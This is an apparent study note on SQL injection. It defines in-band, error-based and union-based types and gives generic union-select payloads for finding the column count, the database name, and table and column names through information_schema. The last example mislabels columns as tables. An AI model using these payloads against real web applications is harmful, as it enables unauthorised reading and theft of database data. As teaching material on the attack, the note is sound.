SQL injection is an attack on a web application database server that causes malicious queries to be executed
# Types
## In-Band
in-band sql injection refers to the same method of communication being used to exploit the vulnerability and also receive the results 
## Error-based
This sql injection uses errors to determine the database structure and other things
## Union-based
This type of injection utilities the union operator to return additional results to the page
# Gaining information
## Column number
by using union and increasingly larger selects to determine the column size
```sql
union select 1,...,n
```
## Database name
using database() function you can work out what the database is
```sql
(some value that wont come up) union select 1,...,database()
```
## Table names
using information_schema.tables you can get the tables of the database
```sql
(some value that wont come up) union select 1,...,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'database_name'
```
## Column names
using information_schema.columns you can get the tables of the database
```sql
(some value that wont come up) union select 1,...,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'database_name'
```